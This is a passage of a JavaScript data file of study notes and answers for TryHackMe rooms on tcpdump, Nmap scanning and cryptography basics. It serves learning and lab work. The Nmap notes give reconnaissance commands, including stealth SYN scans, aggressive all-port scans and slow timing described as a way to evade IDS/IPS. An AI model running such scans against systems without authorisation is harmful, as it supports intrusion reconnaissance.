  port 53              → DNS traffic (both TCP and UDP port 53)
  port 80              → HTTP traffic
  src port PORT        → packets from specific source port
  dst port PORT        → packets to specific destination port
  Example: sudo tcpdump -i ens5 port 53 -n

FILTERING BY PROTOCOL:
  ip                   → IPv4 packets
  ip6                  → IPv6 packets
  tcp                  → TCP packets only
  udp                  → UDP packets only
  icmp                 → ICMP packets only
  arp                  → ARP packets
  Example: sudo tcpdump -i ens5 icmp -n

LOGICAL OPERATORS:
  and  → BOTH conditions must be true
         tcpdump host 1.1.1.1 and tcp
  or   → EITHER condition true
         tcpdump udp or icmp
  not  → condition must NOT be true
         tcpdump not tcp   → shows UDP, ICMP, ARP (everything except TCP)

COMBINATION EXAMPLES:
  tcpdump -i any tcp port 22             → SSH traffic on all interfaces
  tcpdump -i eth0 host example.com and tcp port 443 -w https.pcap

COUNTING WITH wc:
  tcpdump -r traffic.pcap src host 192.168.1.1 -n | wc
  → Last column in wc output = number of lines = number of packets`,
        commands: [
          'sudo tcpdump host 8.8.8.8',
          'sudo tcpdump src host 192.168.1.1 -n',
          'sudo tcpdump dst host 192.168.1.1 -n',
          'sudo tcpdump port 53 -n',
          'sudo tcpdump port 80 or port 443 -n',
          'sudo tcpdump icmp -n',
          'sudo tcpdump not tcp -n',
          'sudo tcpdump host example.com and tcp port 443 -w https.pcap',
          '// Count packets from specific host:',
          'tcpdump -r traffic.pcap src host 192.168.124.1 -n | wc',
        ],
        answer: "26",
      },
      {
        num: 3,
        title: "Advanced Filtering — TCP Flags",
        notes: `PACKET SIZE FILTERING:
  greater LENGTH  → packets >= specified length in bytes
  less LENGTH     → packets <= specified length in bytes

BINARY OPERATIONS:
  & (AND): returns 1 only if BOTH inputs are 1
  | (OR):  returns 1 if EITHER input is 1
  ! (NOT): inverts the bit

HEADER BYTE FILTERING:
  Syntax: proto[expr:size]
  → proto = protocol (arp, ether, icmp, ip, tcp, udp)
  → expr = byte offset (0 = first byte)
  → size = number of bytes to read (default: 1)

TCP FLAGS FILTERING:
  Using: tcp[tcpflags]

Available TCP flag names:
  tcp-syn    → SYN (Synchronize) — connection initiation
  tcp-ack    → ACK (Acknowledge) — acknowledgment
  tcp-fin    → FIN (Finish) — connection termination
  tcp-rst    → RST (Reset) — connection reset
  tcp-push   → PSH (Push) — push data immediately

COMMON TCP FLAG FILTERS:
  "tcp[tcpflags] == tcp-syn"              → ONLY SYN flag set (all others unset)
  "tcp[tcpflags] & tcp-syn != 0"         → AT LEAST SYN flag set
  "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0" → at least SYN OR ACK set
  "tcp[tcpflags] == tcp-rst"             → ONLY RST flag set

QUOTE MARKS:
  Use quotes around expressions with brackets to avoid shell interpretation`,
        commands: [
          '// Capture only SYN packets (connection initiations):',
          'tcpdump -r traffic.pcap "tcp[tcpflags] == tcp-syn" -n',
          '// Capture only RST packets:',
          'tcpdump -r traffic.pcap "tcp[tcpflags] == tcp-rst" -n',
          '// Packets at least SYN or ACK:',
          'tcpdump -r traffic.pcap "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0" -n',
          '// Large packets (>15000 bytes):',
          'tcpdump -r traffic.pcap greater 15000 -n',
          '// Count RST-only packets:',
          'tcpdump -r traffic.pcap "tcp[tcpflags] == tcp-rst" -n | wc -l',
        ],
        answer: "57",
      },
      {
        num: 4,
        title: "Displaying Packets",
        notes: `DISPLAY OPTIONS:

-q (Quick output):
  → Brief packet information (timestamp, IPs, ports, protocol, length)
  → Shorter lines than default

-e (Link-level header):
  → Include MAC addresses in output
  → Shows: source MAC → dest MAC, EtherType
  → Useful for ARP, DHCP, and local network analysis

-A (ASCII):
  → Display packet data as ASCII characters
  → Good for plaintext protocols (HTTP, SMTP, FTP credentials)
  → Non-ASCII bytes shown as dots

-xx (Hexadecimal):
  → Display ALL bytes (including headers) in hex format
  → Format: 0x0000: [16 bytes per line]
  → Shows ENTIRE frame from start (Ethernet header included)

-X (Hex + ASCII):
  → Combines hex AND ASCII side by side
  → Starts from IP header (not Ethernet) unless -e also used
  → Most useful for reading packet contents
  → Format: 0x0000: [hex bytes]  [ASCII representation]

NOTE: -xx includes link-layer header; -X starts from IP layer

EXAMPLE: ARP ANALYSIS WITH MAC:
  tcpdump -r TwoPackets.pcap -e
  → Shows source/dest MAC addresses for each packet`,
        commands: [
          'tcpdump -r capture.pcap -q',
          'tcpdump -r capture.pcap -e',
          'tcpdump -r capture.pcap -A',
          'tcpdump -r capture.pcap -xx',
          'tcpdump -r capture.pcap -X',
          '// Capture live with hex+ASCII display:',
          'sudo tcpdump -i eth0 -X port 80',
          '// Show ARP with MAC addresses:',
          'sudo tcpdump -i eth0 arp -e -n',
        ],
        answer: "52:54:00:7c:d3:5b",
      },
    ],
    tools: ["tcpdump", "libpcap"],
    mitre: [
      "T1040 — Network Sniffing",
      "T1046 — Network Service Discovery",
    ],
    personalNotes:
      "Key tcpdump flags: -i (interface), -w (write), -r (read), -c (count), -n (no DNS), -nn (no DNS+port), -v (verbose), -A (ASCII), -X (hex+ASCII), -e (MAC addresses). TCP flag filter: tcp[tcpflags] == tcp-syn (exact) vs tcp[tcpflags] & tcp-syn != 0 (at least). Quote complex filters in double quotes.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "nmap-the-basics",
    title: "Nmap: The Basics",
    platform: "TryHackMe",
    category: "Enumeration",
    difficulty: "Easy",
    icon: "🗺️",
    completed: true,
    tags: ["Nmap", "Port Scanning", "Service Detection", "OS Detection", "Network Scanning", "Reconnaissance"],
    overview:
      "Learn how to use Nmap — the most powerful network scanner. Covers host discovery (-sn), TCP port scans (-sT connect, -sS stealth SYN), UDP scanning (-sU), service/version detection (-sV), OS detection (-O), timing templates (-T0 to -T5), output formats, and verbosity control.",
    keyLearnings: [
      "Nmap = open-source network scanner, first published 1997",
      "-sn = ping scan (host discovery only, no port scanning)",
      "Local network scan uses ARP requests; remote network scan uses ICMP + TCP SYN/ACK probes",
      "-sT = TCP connect scan (complete 3-way handshake, noisier, no root needed)",
      "-sS = SYN stealth scan (only sends SYN, never completes handshake, requires root/sudo)",
      "-sU = UDP scan",
      "-sV = service/version detection | -O = OS detection | -A = all (OS + version + traceroute)",
      "-F = fast (top 100 ports) | -p- = all ports | -p1-1023 = well-known ports",
      "-Pn = treat all hosts as online (scan even hosts that don't respond to ping)",
      "Timing: -T0 (paranoid, 9.8 hours) to -T5 (insane); -T3 is default normal",
      "Run with sudo for best results; without sudo defaults to -sT (connect scan)",
    ],
    tasks: [
      {
        num: 1,
        title: "Host Discovery — Who Is Online",
        notes: `NMAP TARGET SPECIFICATION:
  IP range:    192.168.0.1-10       → scan IP range
  CIDR subnet: 192.168.0.1/24       → scan entire subnet (254 hosts)
  Hostname:    example.thm          → scan by hostname

HOST DISCOVERY (-sn PING SCAN):
  nmap -sn 192.168.0.0/24   → discover live hosts only, no port scanning

LOCAL NETWORK SCANNING:
  → Nmap sends ARP requests to discover devices
  → ARP replies = "Host is up"
  → Also shows MAC addresses and vendor info
  → Only works when directly connected to the same network

REMOTE NETWORK SCANNING (separated by routers):
  → Cannot use ARP (doesn't cross routers)
  → Uses: ICMP echo requests + ICMP timestamp requests
          + TCP SYN to port 443 + TCP ACK to port 80
  → If no response to any: "Host is down"

LIST SCAN (-sL):
  nmap -sL 192.168.0.1/24   → lists targets WITHOUT scanning
  → Useful to confirm targets before running actual scan
  → Good for verifying large target lists

IMPORTANT NOTE:
  → Run Nmap with sudo for full capabilities
  → Without root: limited to TCP connect scan
  → With root: can use SYN scan, UDP scan, OS detection, etc.`,
        commands: [
          '// Host discovery scan:',
          'sudo nmap -sn 192.168.0.0/24',
          '// List targets without scanning:',
          'nmap -sL 192.168.0.1/24',
          '// Scan specific range:',
          'sudo nmap -sn 10.0.0.1-100',
          '// Scan specific hosts:',
          'sudo nmap -sn 10.10.10.1 10.10.10.2 10.10.10.3',
          '// Check what IP 192.168.0.1/27 covers:',
          '// /27 = 32 IPs → 192.168.0.0 to 192.168.0.31',
        ],
        answer: "192.168.0.31",
      },
      {
        num: 2,
        title: "Port Scanning — Who Is Listening",
        notes: `PORT SCAN TYPES:

─── TCP CONNECT SCAN (-sT) ───
  → Attempts to COMPLETE the three-way handshake
  → OPEN port: handshake completes → Nmap tears down connection with RST-ACK
  → CLOSED port: server responds with RST-ACK immediately
  → Noisier (logged by services) | Does NOT require root/sudo
  → Default scan type when running WITHOUT root privileges

─── TCP SYN SCAN / STEALTH SCAN (-sS) ───
  → Sends only SYN packet → does NOT complete the handshake
  → OPEN port: receives SYN-ACK → Nmap responds with RST (not ACK)
  → CLOSED port: receives RST-ACK (same as -sT)
  → Stealthier → fewer logs (connection never established)
  → REQUIRES root/sudo → default scan type WITH root privileges
  → Preferred scan type

─── UDP SCAN (-sU) ───
  → Sends UDP packets to target ports
  → No response or ICMP port unreachable → port may be open or filtered
  → ICMP port unreachable → port is CLOSED
  → Slower than TCP scans; important for finding DNS, DHCP, SNMP, etc.

PORT RANGE OPTIONS:
  (default)    → top 1,000 most common ports
  -F           → Fast mode — top 100 most common ports
  -p1-1024     → specific port range
  -p80,443     → specific ports (comma-separated)
  -p-          → ALL 65535 ports (most thorough, slowest)
  -p1-1023     → well-known ports

STATE MEANINGS:
  open         → service is listening on this port
  closed       → port accessible but no service listening
  filtered     → firewall blocking — Nmap can't determine state`,
        commands: [
          '// TCP SYN scan (requires sudo):',
          'sudo nmap -sS MACHINE_IP',
          '// TCP connect scan (no sudo needed):',
          'nmap -sT MACHINE_IP',
          '// UDP scan:',
          'sudo nmap -sU MACHINE_IP',
          '// Fast scan (top 100 ports):',
          'sudo nmap -F MACHINE_IP',
          '// Scan all ports:',
          'sudo nmap -sS -p- MACHINE_IP',
          '// Scan specific ports:',
          'sudo nmap -sS -p22,80,443,8080 MACHINE_IP',
          '// Scan well-known ports:',
          'sudo nmap -sS -p1-1023 MACHINE_IP',
        ],
        answer: "6",
      },
      {
        num: 3,
        title: "Service and Version Detection",
        notes: `─── SERVICE VERSION DETECTION (-sV) ───
  → Nmap tries to identify WHAT service is running and ITS VERSION
  → Adds a "VERSION" column to output
  → Example: 22/tcp open  ssh  OpenSSH 8.9p1 Ubuntu 3ubuntu0.10

─── OS DETECTION (-O) ───
  → Nmap makes educated guess about target operating system
  → Uses various indicators (TCP/IP fingerprinting)
  → Not 100% accurate — but usually close
  → Example output:
    Running: Linux 4.X|5.X
    OS details: Linux 4.15 - 5.8

─── COMBINED FLAG (-A) ───
  → Enables ALL of the following simultaneously:
    -O  OS detection
    -sV Service version detection
    Traceroute
    Default scripts
  → Most information per scan but also most detectable/noisy

─── FORCE SCAN WITH -Pn ───
  → Some hosts don't respond to ping/host discovery probes
  → Nmap marks them as "down" and skips port scanning
  → -Pn forces Nmap to scan ALL specified hosts even if they appear down
  → Useful when ICMP is blocked by firewall

COMBINING OPTIONS:
  sudo nmap -sS -sV -O MACHINE_IP      → SYN scan + version + OS detection
  sudo nmap -A MACHINE_IP              → same as above + more
  sudo nmap -sS -sV -p- MACHINE_IP    → all ports + version detection`,
        commands: [
          '// Version detection:',
          'sudo nmap -sS -sV MACHINE_IP',
          '// OS detection:',
          'sudo nmap -sS -O MACHINE_IP',
          '// Full aggressive scan:',
          'sudo nmap -A MACHINE_IP',
          '// Scan hosts that appear down:',
          'sudo nmap -Pn MACHINE_IP',
          '// Combine multiple options:',
          'sudo nmap -sS -sV -O -p- MACHINE_IP',
        ],
        answer: "lighttpd 1.4.74",
      },
      {
        num: 4,
        title: "Timing and Output",
        notes: `─── TIMING TEMPLATES (-T0 to -T5) ───

  -T0 (paranoid)   → 9.8 HOURS   — waits 5 minutes between probes
  -T1 (sneaky)     → 27.5 minutes — waits 15 seconds between probes
  -T2 (polite)     → 40 seconds  — waits 0.4 seconds between probes
  -T3 (normal)     → DEFAULT — as fast as possible reliably
  -T4 (aggressive) → faster than T3 — assumes fast, reliable network
  -T5 (insane)     → maximum speed — may miss results

USE CASES:
  T0/T1 → evade IDS/IPS; avoid detection in sensitive environments
  T2    → be polite to network resources
  T3    → default for most situations
  T4    → pentest labs and trusted networks
  T5    → never use in production

OTHER TIMING OPTIONS:
  --min-parallelism <n>   → minimum parallel probes
  --max-parallelism <n>   → maximum parallel probes
  --min-rate <n>          → minimum packets per second
  --max-rate <n>          → maximum packets per second
  --host-timeout <time>   → max time to wait for slow hosts

─── VERBOSITY AND DEBUGGING ───
  -v          → verbose (shows real-time scan progress)
  -vv / -vvvv → more verbose levels
  -v2 / -v4   → specify verbosity level directly
  -d          → debugging output
  -d9         → maximum debugging (thousands of lines)

─── OUTPUT FORMATS ───
  -oN <file>  → Normal output (human-readable)
  -oX <file>  → XML output (machine-readable)
  -oG <file>  → Grepable output (use with grep/awk)
  -oA <base>  → All three formats at once (creates .nmap, .xml, .gnmap)`,
        commands: [
          '// Normal timing (default):',
          'sudo nmap -sS MACHINE_IP',
          '// Slow/stealthy:',
          'sudo nmap -sS -T1 MACHINE_IP',
          '// Aggressive (fast):',
          'sudo nmap -sS -T4 MACHINE_IP',
          '// Save all output formats:',
          'sudo nmap -sS MACHINE_IP -oA results',
          '// Save normal output:',
          'sudo nmap -sS MACHINE_IP -oN scan.txt',
          '// Verbose scan:',
          'sudo nmap -sS -v MACHINE_IP',
          '// Aggressive + all ports + version + output:',
          'sudo nmap -A -p- -T4 MACHINE_IP -oA full_scan',
        ],
        answer: "-T aggressive",
      },
    ],
    tools: ["Nmap"],
    mitre: [
      "T1046 — Network Service Discovery",
      "T1595.001 — Active Scanning: Scanning IP Blocks",
      "T1595.002 — Active Scanning: Vulnerability Scanning",
    ],
    personalNotes: `Nmap muscle memory commands:
  sudo nmap -sn 10.10.10.0/24              → host discovery
  sudo nmap -sS -sV -O TARGET              → standard recon
  sudo nmap -A -p- -T4 TARGET -oA output  → full aggressive
  sudo nmap -sS -p- --min-rate 5000 TARGET → fast all-ports

-sS requires sudo. Without sudo = -sT. -T4 for CTFs, -T1/-T2 for stealth.
Always run -sn first, then port scan discovered hosts.`,
  },


  // ═══════════════════════════════════════════════════════
  // CRYPTOGRAPHY
  // ═══════════════════════════════════════════════════════

  {
    id: "cryptography-basics",
    title: "Cryptography Basics",
    platform: "TryHackMe",
    category: "Cryptography",
    difficulty: "Easy",
    icon: "🔐",
    completed: true,
    tags: ["Cryptography", "Caesar Cipher", "AES", "RSA", "XOR", "Modulo", "Symmetric", "Asymmetric"],
    overview:
      "Introduction to cryptography fundamentals. Covers the importance of cryptography (PCI DSS, HIPAA, GDPR), key terms (plaintext, ciphertext, cipher, key), the Caesar cipher, symmetric vs asymmetric encryption (DES, 3DES, AES, RSA, Diffie-Hellman, ECC), and the mathematical foundations: XOR operation and modulo arithmetic.",
    keyLearnings: [
      "Cryptography ensures: confidentiality, integrity, and authenticity of communications",
      "PCI DSS = standard required for handling credit card information",
      "Plaintext → Encryption(cipher + key) → Ciphertext | Ciphertext → Decryption(cipher + key) → Plaintext",
      "Caesar Cipher: shift each letter by N positions — only 25 possible keys (brute-forceable)",
      "Symmetric encryption = same key for encrypt/decrypt (DES, 3DES, AES) — fast but key sharing is hard",
      "DES (1977, 56-bit) broken in <24hrs 1999 | 3DES deprecated 2019 | AES adopted 2001 (128/192/256-bit)",
      "Asymmetric encryption = public key encrypts, private key decrypts (RSA, Diffie-Hellman, ECC)",
      "RSA minimum recommended key: 2048-bit | ECC 256-bit ≈ RSA 3072-bit security",
      "XOR: A ⊕ A = 0 | A ⊕ 0 = A | commutative and associative — basis of simple symmetric encryption",
      "Modulo (X%Y) = remainder of X÷Y — not reversible; foundational to RSA and Diffie-Hellman",
    ],
    tasks: [
      {
        num: 1,
        title: "Importance of Cryptography",
        notes: `CRYPTOGRAPHY — DEFINITION:
The practice and study of techniques for secure communication and data protection where adversaries are present.

WHAT CRYPTOGRAPHY PROTECTS:
  CONFIDENTIALITY → only authorised parties can read the data
  INTEGRITY       → data has not been altered or tampered with
  AUTHENTICITY    → data genuinely comes from the claimed source

WHERE YOU USE CRYPTOGRAPHY DAILY:
  → Logging in to websites → credentials are encrypted in transit
  → SSH sessions → encrypted tunnel prevents eavesdropping
  → Online banking → browser verifies server certificate
  → Downloading files → hash functions verify correct download

COMPLIANCE STANDARDS REQUIRING CRYPTOGRAPHY:
  PCI DSS (Payment Card Industry Data Security Standard)
    → Required when handling credit card information
    → Data must be encrypted AT REST and IN MOTION

  HIPAA / HITECH (USA)   → medical records
  GDPR (EU)              → personal data of EU citizens
  DPA (UK)               → Data Protection Act

DATA STATES:
  At rest    → data stored on disk (database, file system)
  In motion  → data being transmitted across a network`,
        commands: [],
        answer: "PCI DSS",
      },
      {
        num: 2,
        title: "Plaintext to Ciphertext — Key Terms",
        notes: `KEY TERMS — MEMORIZE THESE:

PLAINTEXT:
  → The original, readable message or data before encryption
  → Can be a document, image, multimedia file, or any binary data
  → Not necessarily text — could be a cat photo or medical records

CIPHERTEXT:
  → The scrambled, unreadable version after encryption
  → Ideally reveals NO information about the original plaintext
  → Only approximate size might be detectable

CIPHER:
  → An algorithm or method to convert plaintext into ciphertext and back
  → Usually developed by a mathematician
  → The cipher itself is typically PUBLIC knowledge

KEY:
  → A string of bits the cipher uses to encrypt or decrypt
  → The CIPHER is public; the KEY must remain secret (except public key in asymmetric)

ENCRYPTION:
  → The process of converting plaintext into ciphertext using a cipher and a key
  → Plaintext + Key → Cipher → Ciphertext

DECRYPTION:
  → The REVERSE process — converting ciphertext back into plaintext
  → Ciphertext + Key → Cipher → Plaintext
  → Without knowledge of the key, recovery should be IMPOSSIBLE (infeasible)`,
        commands: [],
        answer: null,
      },
      {
        num: 3,
        title: "Historical Ciphers — Caesar Cipher",
        notes: `CAESAR CIPHER:
  → One of the simplest historical ciphers from the first century BCE
  → Shift each letter by a certain number of positions to the right

ENCRYPTION EXAMPLE:
  Plaintext: TRYHACKME
  Key: 3 (right shift by 3)
  T→W, R→U, Y→B, H→K, A→D, C→F, K→N, M→P, E→H
  Ciphertext: WUBKDFNPH

DECRYPTION:
  → Shift each letter in the OPPOSITE direction by the same amount
  → Ciphertext: WUBKDFNPH  Key: 3  → left shift by 3 → TRYHACKME

SECURITY:
  → Only 25 possible keys (shifting by 26 = unchanged letter)
  → Trivially brute-forced by trying all 25 options
  → INSECURE by modern standards — publicly known cipher

OTHER HISTORICAL CIPHERS:
  Vigenère cipher    → 16th century; multiple Caesar shifts
  Enigma machine     → World War II; mechanical polyalphabetic cipher
  One-time pad       → Cold War; only theoretically unbreakable cipher

HOW TO CRACK CAESAR CIPHER:
  Try all 25 shifts until you get readable text (brute force)
  Example: XRPCTCRGNEI shifted back by 14 = ICANENCRYPT`,
        commands: [
          '// Python one-liner to brute-force Caesar cipher:',
          'python3 -c "s=\'WUBKDFNPH\'; [print(f\'Key {k}: {\"\".join(chr((ord(c)-65-k)%26+65) for c in s)}\') for k in range(1,26)]"',
        ],
        answer: "ICANENCRYPT",
      },
      {
        num: 4,
        title: "Symmetric vs Asymmetric Encryption",
        notes: `─── SYMMETRIC ENCRYPTION ───
  Same key used for BOTH encryption and decryption.
  Also called: private key cryptography, secret key cryptography.

  PROBLEM: How do you share the key securely?
  → You can email the encrypted document, but you can't email the password to open it!
  → Requires a separate secure channel to share the key

  EXAMPLES:
  DES (Data Encryption Standard):
    → Adopted as standard: 1977
    → Key size: 56 bits
    → BROKEN in 1999 in <24 hours → INSECURE, do NOT trust
  3DES (Triple DES):
    → DES applied three times; key size: 168 bits (effective: 112 bits)
    → Was an ad-hoc fix when DES was broken
    → Deprecated in 2019 → should be replaced by AES
  AES (Advanced Encryption Standard):
    → Adopted as standard: 2001 (current gold standard)
    → Key sizes: 128, 192, or 256 bits
    → SECURE for current use

─── ASYMMETRIC ENCRYPTION ───
  Two different keys: PUBLIC key for encryption, PRIVATE key for decryption.
  Also called: public key cryptography.

  EXAMPLES:
  RSA:
    → Key sizes: 2048-bit minimum (recommended), 3072-bit, 4096-bit
  Diffie-Hellman:
    → Key sizes: 2048-bit minimum, 3072-bit, 4096-bit
  ECC (Elliptic Curve Cryptography):
    → 256-bit ECC ≈ 3072-bit RSA security (more efficient)

  ADVANTAGE: No need to share a secret key in advance
  DISADVANTAGE: Slower than symmetric encryption

REAL WORLD: Asymmetric is used ONCE to agree on a symmetric key, then symmetric is used for actual communication (faster).`,
        commands: [],
        answer: "2001",
      },
      {
        num: 5,
        title: "XOR and Modulo — Basic Math",
        notes: `─── XOR (Exclusive OR) — ⊕ or ^ ───

TRUTH TABLE:
  0 ⊕ 0 = 0  |  0 ⊕ 1 = 1  |  1 ⊕ 0 = 1  |  1 ⊕ 1 = 0
  (returns 1 if bits are DIFFERENT, 0 if the SAME)

KEY PROPERTIES:
  A ⊕ A = 0       → XOR with itself = zero
  A ⊕ 0 = A       → XOR with zero = unchanged
  A ⊕ B = B ⊕ A   → commutative
  (A ⊕ B) ⊕ C = A ⊕ (B ⊕ C) → associative

CRYPTO USE — SIMPLE SYMMETRIC ENCRYPTION:
  C = P ⊕ K       → encrypt: XOR plaintext with key
  P = C ⊕ K       → decrypt: XOR ciphertext with same key
  Proof: C ⊕ K = (P ⊕ K) ⊕ K = P ⊕ (K ⊕ K) = P ⊕ 0 = P ✓

EXAMPLE:
  1010 ⊕ 1100 = 0110 (bit by bit: 1⊕1=0, 0⊕1=1, 1⊕0=1, 0⊕0=0)

─── MODULO (% or mod) ───

DEFINITION: X%Y = the REMAINDER when X is divided by Y

EXAMPLES:
  25%5 = 0   (25 = 5×5 + 0)
  23%6 = 5   (23 = 3×6 + 5)
  23%7 = 2   (23 = 3×7 + 2)
  60%12 = 0  (60 = 5×12 + 0)

IMPORTANT PROPERTIES:
  → Always returns 0 to (Y-1) for any positive Y
  → NOT REVERSIBLE: x%5 = 4 has infinite solutions
  → Foundational to RSA, Diffie-Hellman, and other cryptosystems
  → For large numbers: use Python (built-in arbitrary precision int)`,
        commands: [
          '// Python for large modulo calculations:',
          'python3 -c "print(118613842 % 9091)"',
          '// XOR in Python:',
          'python3 -c "print(bin(0b1001 ^ 0b1010))"  // 0011',
          '// RSA modular exponentiation:',
          'python3 -c "print(pow(13, 163, 31243))"  // fast modular exponent',
        ],
        answer: null,
      },
    ],
    tools: ["Python3 (for modulo/XOR math)"],
    mitre: [
      "T1573 — Encrypted Channel",
      "T1600 — Weaken Encryption",
    ],
    personalNotes:
      "DES key size = 56-bit BROKEN. AES adopted 2001 — memorise. XOR is the building block of the one-time pad (theoretically unbreakable if key is truly random and same length as plaintext). Modulo is NOT reversible — this property is what makes RSA and Diffie-Hellman secure.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "public-key-cryptography-basics",
    title: "Public Key Cryptography Basics",
    platform: "TryHackMe",
    category: "Cryptography",
    difficulty: "Easy",
    icon: "🔑",
    completed: true,
    tags: ["RSA", "Diffie-Hellman", "SSH Keys", "Certificates", "Digital Signatures", "PGP", "GPG", "PKI"],
    overview:
      "Covers the practical applications of asymmetric cryptography: RSA (math, variables p/q/n/e/d/c/m), Diffie-Hellman key exchange step-by-step, SSH key authentication and generation, digital signatures and certificate chains (CA, TLS), and PGP/GPG for email encryption and file decryption.",
    keyLearnings: [
      "Asymmetric encryption is slow → used once to agree on symmetric key → then symmetric is used for speed",
      "RSA variables: p and q are large primes, n=p×q, public key=(n,e), private key=(n,d), m=message, c=ciphertext",
      "RSA security: factoring n into p and q is computationally infeasible for 600+ digit numbers",
      "Diffie-Hellman: agree on public p and g → each party picks private a/b → exchange public A/B → compute shared gab mod p",
      "SSH: server authenticated by public key fingerprint | client authenticated by private key",
      "SSH key permissions must be 600 or stricter — otherwise client ignores the key",
      "~/.ssh/authorized_keys holds public keys allowed access to the server",
      "Digital signature = encrypt document hash with private key; verify by decrypting with public key",
      "Certificate chain: Root CA → Intermediate CA → Server Certificate (chain of trust)",
      "GPG: gpg --import backup.key | gpg --decrypt file.gpg",
    ],
    tasks: [
      {
        num: 1,
        title: "Common Use of Asymmetric Encryption — Key Exchange",
        notes: `THE CORE PROBLEM:
  Symmetric encryption is fast but requires sharing a secret key.
  How do you share the key securely over an insecure channel?

ANALOGY — THE LOCKED BOX:
  1. You ask your friend (server) to send you a lock (public key)
  2. You put the secret instructions (symmetric key) in a box
  3. You lock it with their lock (encrypt with public key)
  4. Only they can open it with their key (decrypt with private key)
  5. Now you both have the secret and can use it to communicate

ANALOGY TABLE:
  Secret Code   → Symmetric Encryption Cipher and Key
  Lock          → Public Key
  Lock's Key    → Private Key

REAL WORLD PROCESS:
  1. Client connects to server
  2. Server sends its PUBLIC KEY (in certificate)
  3. Client encrypts a session key using server's public key
  4. Server decrypts using its PRIVATE KEY → both have same session key
  5. All further communication encrypted with fast SYMMETRIC encryption

WHY ASYMMETRIC IS NOT USED THROUGHOUT:
  → Asymmetric encryption is MUCH SLOWER than symmetric
  → RSA operations are computationally expensive
  → So asymmetric is used ONCE to establish the symmetric key, then switched`,
        commands: [],
        answer: "Lock",
      },
      {
        num: 2,
        title: "RSA",
        notes: `RSA — DEFINITION:
Public-key encryption algorithm for secure data transmission over insecure channels.
Security based on: difficulty of factoring large numbers (product of two large primes).

RSA VARIABLES (exam-critical — memorise):
  p and q   → two large prime numbers (chosen by Bob)
  n         → n = p × q (public)
  ϕ(n)      → ϕ(n) = n - p - q + 1 = (p-1)(q-1)
  e         → public exponent — relatively prime to ϕ(n) (public)
  d         → private exponent — e × d ≡ 1 mod ϕ(n) (private)
  Public key   = (n, e)
  Private key  = (n, d)
  m         → plaintext message (number representation)
  c         → ciphertext = m^e mod n
  Decrypt   → m = c^d mod n

NUMERICAL EXAMPLE:
  p=157, q=199 → n=31243
  ϕ(n) = 31243-157-199+1 = 30888
  e=163, d=379 (since 163×379 mod 30888 = 1)
  Public key: (31243, 163) | Private key: (31243, 379)
  Encrypt x=13: y = 13^163 mod 31243 = 16341
  Decrypt: x = 16341^379 mod 31243 = 13 ✓

COMPUTING n = p × q:
  If p=4391 and q=6659 → n = 4391 × 6659 = 29239669

COMPUTING ϕ(n):
  ϕ(n) = n - p - q + 1 = 29239669 - 4391 - 6659 + 1 = 29228620

CTF TOOLS:
  RsaCtfTool → automated RSA CTF challenge solver
  rsatool → manual RSA computation tool`,
        commands: [
          '// Python RSA calculations:',
          'python3 -c "p=4391; q=6659; n=p*q; print(n)"',
          '// 29239669',
          'python3 -c "p=4391; q=6659; n=p*q; phi=(p-1)*(q-1); print(phi)"',
          '// 29228620',
          '// Modular exponentiation (encrypt):',
          'python3 -c "print(pow(13, 163, 31243))"',
          '// Modular exponentiation (decrypt):',
          'python3 -c "print(pow(16341, 379, 31243))"',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Diffie-Hellman Key Exchange",
        notes: `DIFFIE-HELLMAN — PURPOSE:
Allows two parties to establish a SHARED SECRET over an insecure channel WITHOUT a pre-existing shared secret and without an eavesdropper being able to determine the key.

5-STEP PROCESS:
  STEP 1 — Agree on public variables:
    → Large prime number p and generator g (0 < g < p)
    → These are PUBLIC and transmitted openly
    → Example: p=29, g=3

  STEP 2 — Each party chooses a private integer:
    → Alice chooses a (private, never shared)
    → Bob chooses b (private, never shared)
    → Example: a=13, b=15

  STEP 3 — Calculate public keys:
    → Alice: A = g^a mod p = 3^13 mod 29 = 19
    → Bob:   B = g^b mod p = 3^15 mod 29 = 26

  STEP 4 — Key exchange:
    → Alice sends A=19 to Bob
    → Bob sends B=26 to Alice
    → These are PUBLIC — anyone can see them

  STEP 5 — Calculate shared secret:
    → Alice: B^a mod p = 26^13 mod 29 = 10
    → Bob:   A^b mod p = 19^15 mod 29 = 10
    → Both get the SAME result: g^(ab) mod p = SHARED SECRET

EAVESDROPPER SEES:
  p, g, A, B — but NOT a or b → cannot compute shared secret

COMBINED WITH RSA:
  → Diffie-Hellman = key agreement (establish shared secret)
  → RSA = digital signatures, key transport, authentication
  → Together: prevents man-in-the-middle attacks`,
        commands: [
          '// Python DH calculations:',
          '// p=29, g=5, a=12:  A = 5^12 mod 29',
          'python3 -c "print(pow(5, 12, 29))"  // A = 7',
          '// p=29, g=5, b=17:  B = 5^17 mod 29',
          'python3 -c "print(pow(5, 17, 29))"  // B = 9',
          '// Shared secret (Alice): B^a mod p = 9^12 mod 29',
          'python3 -c "print(pow(9, 12, 29))"  // = 24',
          '// Shared secret (Bob):   A^b mod p = 7^17 mod 29',
          'python3 -c "print(pow(7, 17, 29))"  // = 24 (same!)',
        ],
        answer: null,
      },
      {
        num: 4,
        title: "SSH — Public Key Authentication",
        notes: `SSH KEY AUTHENTICATION FLOW:

SERVER AUTHENTICATION (first connection):
  → SSH client shows server's PUBLIC KEY FINGERPRINT
  → User must verify the fingerprint matches expected server
  → "Are you sure you want to continue connecting?" → type yes
  → SSH client records the key in ~/.ssh/known_hosts
  → If server later shows a DIFFERENT key → WARNING (possible MITM)

CLIENT AUTHENTICATION (logging in):
  → Server has authorized_keys file listing allowed public keys
  → Client proves identity by having the matching private key
  → Much more secure than passwords

GENERATING SSH KEYS:
  ssh-keygen -t ed25519    → generate Ed25519 key pair (recommended)
  ssh-keygen -t rsa        → generate RSA key pair (longer keys)
  Generates: id_ed25519 (private) and id_ed25519.pub (public)

SUPPORTED ALGORITHMS:
  rsa, dsa, ecdsa, ecdsa-sk, ed25519, ed25519-sk

IMPORTANT SECURITY RULES:
  → Private key permissions: 600 or stricter (owner read/write ONLY)
  → If permissions are wrong, SSH ignores the key with a warning
  → NEVER share your private key — treat it like a password
  → Passphrase encrypts the private key file (adds extra layer)
  → Passphrase is NEVER transmitted — only decrypts local key

KEY FILES:
  ~/.ssh/id_ed25519      → private key (NEVER share)
  ~/.ssh/id_ed25519.pub  → public key (safe to share)
  ~/.ssh/authorized_keys → public keys allowed to log into server
